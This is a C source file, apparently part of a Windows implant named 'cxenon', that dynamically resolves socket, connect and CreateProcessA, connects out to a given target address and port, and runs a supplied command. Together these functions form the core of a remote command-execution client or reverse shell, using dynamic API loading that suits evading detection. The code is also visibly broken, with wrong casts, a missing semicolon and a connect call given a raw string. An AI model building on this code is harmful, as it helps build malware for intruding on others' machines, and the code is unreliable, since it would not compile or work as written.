#include "cxenon.h"

struct functionaddr GetFunctionVA(struct functionaddr* funcVA)
{
    
    funcVA->function_socket = (SOCKET)DynamicFunctionLoad("ws2_32.dll", "socket");
    funcVA->function_connect = (int)DynamicFunctionLoad("ws2_32.dll", "connect");
    funcVA->function_WSAcleanup = (int)DynamicFunctionLoad("ws2_32.dll", "WSACleanup");
    funcVA->function_WSAstartup = (int)DynamicFunctionLoad("ws2_32.dll", "WSAStartup");
    funcVA->function_process = (BOOL)DynamicFunctionLoad("kernel32.dll", "CreateProcessA");
    
    return funcVA;
    
}

int WININIT(void)
{

#if defined(_WIN32)

	WSADATA wsa;
	if (WSAStartup(MAKEWORD(2, 2), &wsa) != 0)
	{
		fprintf(stderr, "\n\afailed to initilize ws2_32.dll");
		return Exit;
	}

	return 0;

#else
	return 0;

#endif
	return UNKNOWN;
	
}


pClientCTX CliInit(const char* inetaddr, const int port)
{

	pClientCTX CTX = malloc(sizeof(ClientCTX));
	if (CTX == NULL) { return Exit; }

	CTX->dstport = port;
	CTX->dstaddr = inetaddr;

	return CTX;

}

SOCKET client_socket(const struct functionaddr* funcVA)
{
    
    errcode status;
    if (funcVA == NULL)
    {
        status = INVALID_POINTER;
        return status;
    }

	SOCKET Socket = funcVA->function_socket(AF_INET, SOCK_STREAM, 0);
	if(Socket == INVALID_SOCKET)
	{
		fprintf(stderr, "\nfailed to create a socket %d", WSAGetLastError());
		WSACleanup();
		return Exit;
	}
	
	return Socket

}

SOCKET client_conn(SOCKET Socket, pClientCTX CTX, const struct functionaddr* funcVA)
{
    
    int result = funcVA->function_connect(Socket, CTX->dstaddr, (int)sizeof(CTX->dstaddr));
	if (result != 0)
	{

		fprintf(stderr, "\n\afailed to connect to target %d.", WSAGetLastError());
		closesocket(Socket);
		free(CTX);
		WSACleanup();

		return Exit;
	}

	free(CTX);
	return Socket;

}

int execute(const char* process, const struct functionaddr* funcVA)
{

	STARTUPINFO SINFO;
	PROCESS_INFORMATION PINFO;
    
    BOOL result = funcVA->function_process(
        NULL,
        process,
        NULL,
        NULL,
        False,
        0,
        NULL,
        NULL,
        &SINFO,
        &PINFO
    );
    if (result > 0)
    {
        printf("\nexecuted command");
    }

    fprintf(stderr, "failed to execute commad %d", GetLastError());

	return 0;

}
